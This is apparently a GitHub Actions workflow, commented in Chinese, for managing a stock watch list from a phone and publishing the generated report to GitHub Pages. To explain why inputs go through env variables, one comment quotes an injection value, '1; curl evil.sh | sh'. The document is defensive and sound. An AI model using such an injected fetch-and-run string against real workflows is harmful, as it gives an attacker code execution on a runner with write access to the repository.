name: 管理追蹤名單

# 這個流程專門給手機用。到 Actions 分頁按「Run workflow」，
# 填好欄位送出，雲端就會幫你改設定、抓資料、重新產生報告並推上線。
on:
  workflow_dispatch:
    inputs:
      action:
        description: "要做什麼"
        required: true
        default: "只更新報告"
        type: choice
        # 〔新增個股〕與〔新增個股並建立季報〕原本是兩個選項。它們不是兩件事
        # ——加進名單之後接著一定是建季報，而先加、後建那條路只是把同一件事拆成
        # 兩次操作，中間夾一個「名單裡有這檔、點進去沒有季報」的狀態。併成一個，
        # 而留下來的那個**一律建季報**。
        #
        # 〔列出目前名單〕拿掉了：報告頁上每一檔都有一張資訊卡，名單本來就攤在
        # 眼前。跑一次 Actions 只為了在 log 裡印一份同樣的東西，是繞遠路。
        #
        # 併掉／拿掉的那兩個字串**不必**在這裡留相容用的別名：這條 workflow 的
        # 呼叫端只有報告頁上那張表單，而它和這裡一起改。
        options:
          - 只更新報告
          - 新增個股
          - 建立或重建季報
          - 隱藏個股
          - 恢復顯示
          - 移除個股
      code:
        description: "股票代號或檔名代號（例如 4063 或 shinetsu）"
        required: false
        type: string
      price_buy:
        description: "股價布局參考線（選填，新增個股時用）"
        required: false
        type: string
      per_buy:
        description: "本益比布局參考線（選填，留空用預設 20）"
        required: false
        type: string
      years:
        description: "季報回溯年數（預設 2）"
        required: false
        default: "2"
        type: string

permissions:
  contents: write
  # 發布 Pages 要的兩個。報告不再進 git，改由 deploy-pages 直接送上去。
  pages: write
  id-token: write

concurrency:
  group: market-monitor-write
  cancel-in-progress: false

jobs:
  manage:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    env:
      JQUANTS_API_KEY: ${{ secrets.JQUANTS_API_KEY }}
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-python@v6
        with:
          python-version: "3.12"

      # 輸入一律走 env，不直接內插進 run 的 shell body。
      #
      # `${{ }}` 是在 shell 看到這段文字**之前**就被展開的——等於把使用者打的字
      # 直接貼進腳本裡。一個 `1; curl evil.sh | sh` 就會在這台握有
      # contents: write 的 runner 上執行。走 env 之後那些字只是變數的值，
      # 再怎麼寫都只是一串字元。
      - name: 執行指定的動作
        env:
          IN_ACTION: ${{ inputs.action }}
          IN_CODE: ${{ inputs.code }}
          IN_YEARS: ${{ inputs.years }}
          IN_PRICE_BUY: ${{ inputs.price_buy }}
          IN_PER_BUY: ${{ inputs.per_buy }}
        run: |
          set -e
          ACTION="$IN_ACTION"
          CODE="$IN_CODE"
          YEARS="$IN_YEARS"
          # 代號只允許數字與英文字母（上櫃有 6xxxL 這種）。這一關擋的不是注入
          # ——env 已經擋掉了——而是「把一坨奇怪的字送進 manage_stock.py」。
          if [ -n "$CODE" ]; then
            case "$CODE" in
              *[!0-9A-Za-z]*)
                echo "::error::股票代號只能是數字或英文字母，收到的是：$CODE"
                exit 1 ;;
            esac
          fi
          EXTRA=""
          if [ -n "$IN_PRICE_BUY" ]; then EXTRA="$EXTRA --price-buy $IN_PRICE_BUY"; fi
          if [ -n "$IN_PER_BUY" ]; then EXTRA="$EXTRA --per-buy $IN_PER_BUY"; fi

          case "$ACTION" in
            # 新增就一定建季報（--build）。分成兩步的那個版本拿掉了，理由寫在
            # 上面 options 那一段。
            "新增個股")
              python manage_stock.py add "$CODE" --build --years "$YEARS" $EXTRA ;;
            "建立或重建季報")
              python manage_stock.py build "$CODE" --years "$YEARS" ;;
            "隱藏個股")
              python manage_stock.py hide "$CODE" ;;
            "恢復顯示")
              python manage_stock.py show "$CODE" ;;
            "移除個股")
              python manage_stock.py remove "$CODE" ;;
            *)
              echo "只更新報告，不改名單" ;;
          esac

      # 這一步留著，而且**沒有** if：它現在是這條 workflow 的收據。
      #
      # 〔列出目前名單〕那個動作拿掉之後，「我改完之後名單長怎樣」這個問題還在，
      # 只是不必再專程跑一趟——每一次操作的 log 裡都會有一份改完之後的名單。
      - name: 目前名單
        run: python manage_stock.py list

      # 為什麼這一步要分岔，而不是一律 `python run.py update`：
      #
      # `run.py update` 的第一件事是 fetch_market_data.py，而那支程式抓的是
      # TAIEX 五年、臺灣 PMI、M1B、上市櫃總市值、VIX、每一檔美股指數、二十幾條
      # FRED 序列（每條二十五年）、日經，然後才輪到名單上每一檔個股。幾十趟
      # 網路來回，跑好幾分鐘——這就是按一下 🙈 要等那麼久的全部原因。
      #
      # 而〔隱藏個股〕改的是 config.json 裡的一個布林值，〔移除個股〕是從陣列裡
      # 拿掉一個元素。這兩件事跟上面那幾十趟來回一點關係都沒有：報告只要拿既有
      # 快取重畫一次（`run.py report`）就好，秒級。
      #
      # 〔恢復顯示〕是唯一的例外，而且例外得剛好：隱藏期間那一檔不會被抓（見
      # fetch_market_data.py 的 load_jp_stocks(include_disabled=False)），所以
      # 它的快取停在被藏起來的那一天。還原之後不補抓，畫面上會出現一張看起來
      # 正常、其實是舊資料的卡片——那比慢還糟。所以補抓，但只補那一檔
      # （`--only`），不是藉機把整個世界重抓一遍。
      - name: 更新資料並產生報告
        id: update
        env:
          IN_ACTION: ${{ inputs.action }}
          IN_CODE: ${{ inputs.code }}
        run: |
          set -e
          case "$IN_ACTION" in
            "隱藏個股"|"移除個股")
              echo "只改名單，不抓資料：拿既有快取重畫報告。"
              python run.py report ;;
            "恢復顯示")
              echo "補抓 $IN_CODE 這一檔（隱藏期間沒抓到的那一段），其餘來源略過。"
              python fetch_market_data.py --only "$IN_CODE" \
                || echo "::warning::補抓失敗，先用既有快取產生報告。"
              python run.py report ;;
            *)
              python run.py update ;;
          esac

      # 為什麼要 `|| steps.update.outcome == 'failure'`：
      #
      # 上面「執行指定的動作」那一步**已經改好 config.json 了**。如果報告產不
      # 出來（來源掛掉、網路不通）就跳過提交，使用者從手機加的那一檔股票會
      # 靜靜地消失——他看到的是一個綠色的 job，然後名單裡沒有那檔。
      #
      # 名單的改動與報告能不能產生是兩件事。名單先存起來，報告下一次排程會補。
      - name: 有變動才提交
        if: success() || steps.update.outcome == 'failure'
        env:
          IN_ACTION: ${{ inputs.action }}
          IN_CODE: ${{ inputs.code }}
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          if git diff --staged --quiet; then
            echo "沒有變動，這次不提交。"
          else
            git commit -m "手機操作：${IN_ACTION} ${IN_CODE}"
            git push
          fi

      # upload-pages-artifact 會把整個資料夾送上去，所以先挑出真的要公開的那一個。
      # 直接送 repo 根目錄的話，config.json、data/、還有整包 Python 都會變成
      # 公開網站的一部分。
      - name: 挑出要公開的檔案
        if: hashFiles('index.html') != ''
        run: |
          mkdir -p pages
          cp index.html pages/index.html

      # ── 發布報告到 GitHub Pages ────────────────────────────────────────
      #
      # 報告不再進 git（見 .gitignore 裡那段），所以它到得了網頁的唯一一條路就是
      # 這三步。以前是「commit 上去，Pages 從 main 根目錄讀」，而那個設定逼著一個
      # 每天重新產生的 1 MB 檔案被版控——每一次合併都撞在它身上，撞出來的衝突還
      # 沒有哪一邊是對的（兩邊都是產生出來的）。
      #
      # ⚠️ 前提：Settings → Pages → Source 要是「GitHub Actions」，不是
      #    「Deploy from a branch」。還停在後者的話，deploy 這一步會失敗——而
      #    那個失敗是對的，因為那時候網頁上顯示的是一份不會再更新的舊報告。
      #
      # `if: hashFiles(...)`：報告產不出來的那幾次（來源掛掉）不要去發布，
      # 讓網址上繼續是上一份好的。
      - name: 準備發布
        if: hashFiles('index.html') != ''
        uses: actions/configure-pages@v5
      - name: 打包報告
        if: hashFiles('index.html') != ''
        uses: actions/upload-pages-artifact@v3
        with:
          path: pages
      - name: 發布
        id: deployment
        if: hashFiles('index.html') != ''
        uses: actions/deploy-pages@v4
